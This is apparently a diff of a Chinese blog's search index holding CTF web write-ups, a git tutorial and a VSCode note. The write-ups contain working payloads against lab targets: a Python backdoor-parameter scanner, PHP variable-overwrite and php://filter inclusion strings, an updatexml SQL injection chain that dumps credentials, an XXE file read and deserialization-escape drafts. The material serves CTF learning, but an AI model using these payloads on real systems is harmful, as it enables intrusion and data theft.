-<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">print(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  							  			<span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:\Users\haodo\Desktop\20211129\高明黑客\src&quot;</span></span><br><span class="line">os.chdir(filePath)													<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span>								<span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span>											 <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">    s1.acquire()												</span><br><span class="line">    print(<span class="string">&#x27;trying   &#x27;</span>+file+ <span class="string">&#x27;     &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:							<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">            gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">            posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">    data = &#123;&#125;														<span class="comment">#所有的$_POST</span></span><br><span class="line">    params = &#123;&#125;														<span class="comment">#所有的$_GET</span></span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">        params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">        data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    url = <span class="string">&#x27;http://fab0ef41-82a7-480e-a354-be549de9731f.node4.buuoj.cn:81/&#x27;</span>+file</span><br><span class="line">    req = session.post(url, data=data, params=params)			<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">    req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">    req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">    content = req.text</span><br><span class="line">    <span class="comment">#print(content)</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:									<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">            req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">            content = req.text</span><br><span class="line">            req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                flag = <span class="number">1</span></span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">                req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">                content = req.text</span><br><span class="line">                req.close()												<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> flag == <span class="number">1</span>:													<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">            param = a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            param = b</span><br><span class="line">        print(<span class="string">&#x27;找到了利用文件： &#x27;</span>+file+<span class="string">&quot;  and 找到了利用的参数：%s&quot;</span> %param)</span><br><span class="line">        print(<span class="string">&#x27;结束时间：  &#x27;</span> + time.asctime(time.localtime(time.time())))</span><br><span class="line">    s1.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> files:															<span class="comment">#加入多线程</span></span><br><span class="line">   t = threading.Thread(target=get_content, args=(i,))</span><br><span class="line">   t.start()</span><br></pre></td></tr></table></figure>
-<p>需要先本地测试，找到马后直接服务器利用即可</p>
-<h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>变量覆盖漏洞</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>好多payload:</p>
-<pre><code>yds=flag
-is=flag&amp;flag=flag
-</code></pre>
-<h2 id="Had-a-bad-day"><a href="#Had-a-bad-day" class="headerlink" title="Had a bad day"></a>Had a bad day</h2><p>php://filter应用</p>
-<p><a href="https://oatmeal.vip/security/web-learning/php-filter/">https://oatmeal.vip/security/web-learning/php-filter/</a></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> 	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))</span><br><span class="line"><span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
-
-<p>构造:</p>
-<pre><code>php://filter/convert.base64-encode/write=woofers/resource=flag
-</code></pre>
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>代码审计</tag>
-        <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20220101</title>
-    <url>/posts/c3e022b4/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>20220206</title>
-    <url>/posts/5fc2094e/</url>
-    <content><![CDATA[<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>先fuzz，过滤了空格</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
-<p>updatexml注入</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库</span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查表</span></span><br><span class="line"><span class="string">admin&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(table_name)<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;geek&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))#</span><br><span class="line"></span><br><span class="line">查列</span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;)),0x7e),1))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查数据</span></span><br><span class="line"><span class="string">admin&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(id,username,password))<span class="keyword">from</span>(geek.H4rDsq1)<span class="keyword">where</span>(id)<span class="keyword">like</span>(<span class="string">&#x27;1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))#</span><br><span class="line"></span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)where(id)like(&#x27;</span><span class="number">1</span><span class="string">&#x27;)),0x7e),1))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag&#123;7e570192-d6e8-4d02-aa0b-d1b684f7ae53&#125;</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>sql注入</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>20220207</title>
     <url>/posts/28c539d8/</url>
     <content><![CDATA[<h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2><span id="more"></span>
@@ -1258,6 +1240,24 @@ is=flag&amp;flag=flag
       </tags>
   </entry>
   <entry>
+    <title>20220206</title>
+    <url>/posts/5fc2094e/</url>
+    <content><![CDATA[<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>先fuzz，过滤了空格</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">admin<span class="string">&#x27; #</span></span><br></pre></td></tr></table></figure>
+<p>updatexml注入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">查库</span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,database(),0x7e),1))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查表</span></span><br><span class="line"><span class="string">admin&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(table_name)<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">&#x27;geek&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))#</span><br><span class="line"></span><br><span class="line">查列</span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;)),0x7e),1))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查数据</span></span><br><span class="line"><span class="string">admin&#x27;</span><span class="keyword">or</span>(updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span>(group_concat(id,username,password))<span class="keyword">from</span>(geek.H4rDsq1)<span class="keyword">where</span>(id)<span class="keyword">like</span>(<span class="string">&#x27;1&#x27;</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))#</span><br><span class="line"></span><br><span class="line">admin<span class="string">&#x27;or(updatexml(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1)where(id)like(&#x27;</span><span class="number">1</span><span class="string">&#x27;)),0x7e),1))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag&#123;7e570192-d6e8-4d02-aa0b-d1b684f7ae53&#125;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>web</tag>
+        <tag>sql注入</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>20220208</title>
     <url>/posts/b87a2449/</url>
     <content><![CDATA[<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">GVI</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;xxe;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">    123</span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
@@ -1292,45 +1292,6 @@ is=flag&amp;flag=flag
         <tag>web</tag>
         <tag>xxe</tag>
         <tag>模板注入</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>20220209</title>
-    <url>/posts/cf7d14df/</url>
-    <content><![CDATA[<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><blockquote>
-<p>好难的题，用了2个小时，反序列化逃逸，上一次做还是在选拔赛上</p>
-</blockquote>
-<pre><code>d0g3_f1ag.php
-
-一些草稿
-_SESSION[phpflag]=s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
-
-&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:39:&quot;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
-;s&#125;
-
-&quot;a:2:&#123;s:7:&quot;&quot;;hhhhh&quot;;s:1:&quot;1&quot;;s:39:&quot;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
-;s&#125;
-
-_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
-此时session数组
-phpfalg ==&gt; ;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
-img ==&gt; 无效路径
-序列化为
-&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
-;s:img:xxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;
-过滤后
-&quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
-;s:img:xxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot; 逃逸成功
-反序列化，此时session数组
-&quot;;s:48: ==&gt; 1
-img ==&gt; L2QwZzNfZmxsbGxsbGFn
-</code></pre>
-<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2>]]></content>
-      <categories>
-        <category>ctf每日一题</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -1433,6 +1394,63 @@ while os.path.exists(p1) or os.path.exists(p2):
       </tags>
   </entry>
   <entry>
+    <title>20220209</title>
+    <url>/posts/cf7d14df/</url>
+    <content><![CDATA[<h2 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h2><blockquote>
+<p>好难的题，用了2个小时，反序列化逃逸，上一次做还是在选拔赛上</p>
+</blockquote>
+<pre><code>d0g3_f1ag.php
+
+一些草稿
+_SESSION[phpflag]=s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
+
+&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:39:&quot;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+;s&#125;
+
+&quot;a:2:&#123;s:7:&quot;&quot;;hhhhh&quot;;s:1:&quot;1&quot;;s:39:&quot;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+;s&#125;
+
+_SESSION[phpflag]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
+此时session数组
+phpfalg ==&gt; ;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;
+img ==&gt; 无效路径
+序列化为
+&quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+;s:img:xxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;
+过滤后
+&quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;
+;s:img:xxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot; 逃逸成功
+反序列化，此时session数组
+&quot;;s:48: ==&gt; 1
+img ==&gt; L2QwZzNfZmxsbGxsbGFn
+</code></pre>
+<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2>]]></content>
+      <categories>
+        <category>ctf每日一题</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>V&amp;NCTF2021</title>
+    <url>/posts/6dd4bc92/</url>
+    <content><![CDATA[<blockquote>
+<p>部分wp</p>
+</blockquote>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="冰冰好像藏着什么密码"><a href="#冰冰好像藏着什么密码" class="headerlink" title="冰冰好像藏着什么密码"></a>冰冰好像藏着什么密码</h3><p>先打开图片，报了一堆错，但能正常提取。FFT是快速傅里叶变化的意思，相当于给了提示，补了一些相关知识。</p>
+<p>原理如下，并不是很复杂：</p>
+<p>首先将图片看作信号,</p>
+<p><img src="https://www.zhihu.com/equation?tex=%5BR+%5C+G+%5C+B%5D+=+f(x,y)"></p>
+]]></content>
+      <categories>
+        <category>ctf学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CUMT初夏赛部分wp</title>
     <url>/posts/b061f28/</url>
     <content><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><blockquote>
@@ -1500,24 +1518,6 @@ print(&#39;&#39;.join(flag))
       </tags>
   </entry>
   <entry>
-    <title>V&amp;NCTF2021</title>
-    <url>/posts/6dd4bc92/</url>
-    <content><![CDATA[<blockquote>
-<p>部分wp</p>
-</blockquote>
-<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="冰冰好像藏着什么密码"><a href="#冰冰好像藏着什么密码" class="headerlink" title="冰冰好像藏着什么密码"></a>冰冰好像藏着什么密码</h3><p>先打开图片，报了一堆错，但能正常提取。FFT是快速傅里叶变化的意思，相当于给了提示，补了一些相关知识。</p>
-<p>原理如下，并不是很复杂：</p>
-<p>首先将图片看作信号,</p>
-<p><img src="https://www.zhihu.com/equation?tex=%5BR+%5C+G+%5C+B%5D+=+f(x,y)"></p>
-]]></content>
-      <categories>
-        <category>ctf学习</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>VSCode简单配置C艹环境</title>
     <url>/posts/c150e260/</url>
     <content><![CDATA[<h2 id="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"><a href="#百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode" class="headerlink" title="百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode"></a>百度教程很多，还学不会的建议继续用Dev，VS也挺好用，不必非要用VSCode</h2><h2 id="脑子是个好东西，建议多动手才好用"><a href="#脑子是个好东西，建议多动手才好用" class="headerlink" title="脑子是个好东西，建议多动手才好用"></a>脑子是个好东西，建议多动手才好用</h2><h2 id="需要的东西已打包，还学不会，建议回家种地"><a href="#需要的东西已打包，还学不会，建议回家种地" class="headerlink" title="需要的东西已打包，还学不会，建议回家种地"></a>需要的东西已打包，还学不会，建议回家种地</h2><h2 id="VSCode在官网上下，别TM随便找到个能下的就下"><a href="#VSCode在官网上下，别TM随便找到个能下的就下" class="headerlink" title="VSCode在官网上下，别TM随便找到个能下的就下"></a>VSCode在官网上下，别TM随便找到个能下的就下</h2><blockquote>
@@ -1553,6 +1553,97 @@ print(&#39;&#39;.join(flag))
       <categories>
         <category>哎，我就是玩</category>
       </categories>
+  </entry>
+  <entry>
+    <title>git学习</title>
+    <url>/posts/e28ceec1/</url>
+    <content><![CDATA[<h1 id="git入门到精通"><a href="#git入门到精通" class="headerlink" title="git入门到精通"></a>git入门到精通</h1><blockquote>
+<p>跟着廖雪峰的教程走了一遍，系统学习一下，感觉挺简单的</p>
+</blockquote>
+<h2 id="创建版本库"><a href="#创建版本库" class="headerlink" title="创建版本库"></a>创建版本库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init 将目录初始化成版本库</span><br><span class="line"></span><br><span class="line">git add &lt;file&gt; 将文件添加到暂存区</span><br><span class="line"></span><br><span class="line">git commit -m &quot;message&quot; 将暂存区文件提交到版本库</span><br><span class="line"></span><br><span class="line">git status 查看库状态</span><br><span class="line"></span><br><span class="line">git diff 查看status修改文件修改内容</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="版本管理"><a href="#版本管理" class="headerlink" title="版本管理"></a>版本管理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log 显示从最近到最远的提交日志 --pretty&#x3D;oneline参数精简显示</span><br><span class="line"></span><br><span class="line">git reset --hard HEAD^ 回退到上个版本，HEAD表示当前版本</span><br><span class="line"></span><br><span class="line">git reset --hard &lt;commit id&gt; 回退到指定版本</span><br><span class="line"></span><br><span class="line">git reflog 记录每次指令，包括commit id</span><br><span class="line"></span><br><span class="line">git checkout -- &lt;file&gt; 丢弃工作区修改，用版本库里的版本替换工作区的版本</span><br><span class="line"></span><br><span class="line">git reset HEAD &lt;file&gt; 将暂存区修改撤销并放回工作区</span><br><span class="line"></span><br><span class="line">git rm &lt;file&gt; 工作区删除后需要rm(add)和commit</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git push origin master 把本地master分支的最新修改推送至GitHub</span><br><span class="line"></span><br><span class="line">git remote -v 查看远程库信息</span><br><span class="line"></span><br><span class="line">git remote rm origin 解除绑定</span><br><span class="line"></span><br><span class="line">git clone git@github.com:XXX&#x2F;XXX.git clone本地库</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="分支管理"><a href="#分支管理" class="headerlink" title="分支管理"></a>分支管理</h2><h3 id="创建与合并分支"><a href="#创建与合并分支" class="headerlink" title="创建与合并分支"></a>创建与合并分支</h3><p>一开始的时候，master分支是一条线，Git用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点：</p>
+<p><img src="https://static.liaoxuefeng.com/files/attachments/919022325462368/0"></p>
+<p>当我们创建新的分支，例如dev时，Git新建了一个指针叫dev，指向master相同的提交，再把HEAD指向dev，就表示当前分支在dev上：</p>
+<p><img src="https://www.liaoxuefeng.com/files/attachments/919022363210080/l"></p>
+<p>不过，从现在开始，对工作区的修改和提交就是针对dev分支了，比如新提交一次后，dev指针往前移动一步，而master指针不变：</p>
+<p><img src="https://www.liaoxuefeng.com/files/attachments/919022387118368/l"></p>
+<p>假如我们在dev上的工作完成了，就可以把dev合并到master上。Git怎么合并呢？最简单的方法，就是直接把master指向dev的当前提交，就完成了合并：</p>
+<p><img src="https://www.liaoxuefeng.com/files/attachments/919022412005504/0"></p>
+<p>合并完分支后，甚至可以删除dev分支。删除dev分支就是把dev指针给删掉，删掉后，我们就剩下了一条master分支：</p>
+<p><img src="https://www.liaoxuefeng.com/files/attachments/919022479428512/0"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git checkout -b &lt;dev&gt; 创建并切换分支到dev</span><br><span class="line"></span><br><span class="line">git branch &lt;name&gt; 创建分支</span><br><span class="line"></span><br><span class="line">git checkout &lt;name&gt; 切换分支</span><br><span class="line"></span><br><span class="line">git branch 查看当前分支</span><br><span class="line"></span><br><span class="line">git merge &lt;dev&gt; 将dev分支上的内容合并到master分支</span><br><span class="line"></span><br><span class="line">git branch -d &lt;dev&gt; 删除dev分支</span><br><span class="line"></span><br><span class="line">新特性switch</span><br><span class="line"></span><br><span class="line">git switch -c &lt;dev&gt; 创建并切换分支到dev</span><br><span class="line"></span><br><span class="line">git switch &lt;dev&gt; 切换分支</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="冲突解决"><a href="#冲突解决" class="headerlink" title="冲突解决"></a>冲突解决</h3><p>当Git无法自动合并分支时，就必须首先解决冲突。解决冲突后，再提交，合并完成。</p>
+<p>解决冲突就是把Git合并失败的文件手动编辑为我们希望的内容，再提交。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git status 查看冲突文件</span><br><span class="line">git log --graph --pretty&#x3D;oneline --abbrev-commit 查看分支合并图</span><br></pre></td></tr></table></figure>
+
+<h3 id="分支管理策略"><a href="#分支管理策略" class="headerlink" title="分支管理策略"></a>分支管理策略</h3><p>在实际开发中，我们应该按照几个基本原则进行分支管理：</p>
+<p>首先，master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；</p>
+<p>那在哪干活呢？干活都在dev分支上，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，在master分支发布1.0版本；</p>
+<p>你和你的小伙伴们每个人都在dev分支上干活，每个人都有自己的分支，时不时地往dev分支上合并就可以了。</p>
+<p>所以，团队合作的分支看起来就像这样：</p>
+<p><img src="https://www.liaoxuefeng.com/files/attachments/919023260793600/0"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git merge --no-ff -m &quot;message&quot; &lt;dev&gt; 禁用Fast forward</span><br></pre></td></tr></table></figure>
+<h3 id="bug分支"><a href="#bug分支" class="headerlink" title="bug分支"></a>bug分支</h3><p>修复bug时，我们会通过创建新的bug分支进行修复，然后合并，最后删除；</p>
